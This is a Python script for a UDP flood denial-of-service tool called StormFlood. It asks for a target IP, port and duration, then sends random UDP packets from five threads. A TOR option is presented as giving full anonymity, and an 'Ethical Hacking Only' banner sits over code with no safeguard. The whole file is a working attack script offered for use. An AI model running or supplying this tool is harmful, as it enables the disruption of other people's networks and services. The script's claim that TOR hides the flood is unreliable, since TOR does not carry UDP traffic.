#!/usr/bin/env python3
# StormFlood v4.1 - Ultimate Auto UDP Flood Tool with TOR Support
# @hiden_25
import socket
import os
import random
import time
import threading
import socks
import stem.process
from datetime import datetime

# Colors
B = '\033[1m'
R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
N = '\033[0m'

# ASCII Banner
def banner():
    os.system("clear")
    print(B + R + """
 ███████╗████████╗ ██████╗ ███╗   ███╗███████╗
 ██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝
 ███████╗   ██║   ██║   ██║██╔████╔██║███████╗
 ╚════██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║
 ███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║
 ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝
 """ + N)
    print(f"{Y}[#] StormFlood v4.1 - Auto UDP Flood Tool with TOR Support")
    print(f"{Y}[#] Developed by: {G}@hiden_25 | H2I CODER | CEO DEVELOPER{N}")
    print("\n" + R + "# Stay Anonymous - Ethical Hacking Only\n" + N)

# Start TOR for 100% Anonymity
def start_tor():
    try:
        print(f"{G}[✔] Starting TOR for Anonymous Proxy...{N}")
        tor_process = stem.process.launch_tor_with_config(config={'SocksPort': '9050'})
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        print(f"{G}[✔] TOR Proxy Activated!{N}")
        return tor_process
    except Exception as e:
        print(f"{R}[X] TOR Start Failed: {e}{N}")
        return None

# Generate Random Packet Size
def generate_packet():
    size = random.randint(512, 2048)
    return random._urandom(size)

# UDP Flood Attack
def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = generate_packet()
    start_time = time.time()

    while time.time() - start_time < duration:
        sock.sendto(packet, (ip, port))
        print(f"[→] Sent UDP packet to {ip} through port: {port}")

# Start Attack
def start_attack(ip, port, duration, use_tor):
    print(f"{G}[✔] StormFlood v4.1 Attack Started on {ip}:{port} for {duration} seconds.{N}")

    tor_process = start_tor() if use_tor else None

    threads = []
    for _ in range(5):  # Multi-threading for faster attack
        thread = threading.Thread(target=udp_flood, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    if tor_process:
        tor_process.kill()
        print(f"{Y}[!] TOR Stopped.{N}")

    print(f"{G}[✔] Attack Finished!{N}")

# Main Function
def main():
    banner()

    ip = input(f"{Y}[$] Target IP: {N}")
    port = int(input(f"{Y}[$] Enter Port (Default: 80): {N}") or 80)
    duration = int(input(f"{Y}[$] Enter Attack Duration (seconds): {N}"))

    use_tor = input(f"{Y}[?] Use TOR Proxy? (y/n): {N}").lower() == "y"

    start_attack(ip, port, duration, use_tor)

if __name__ == "__main__":
    main()
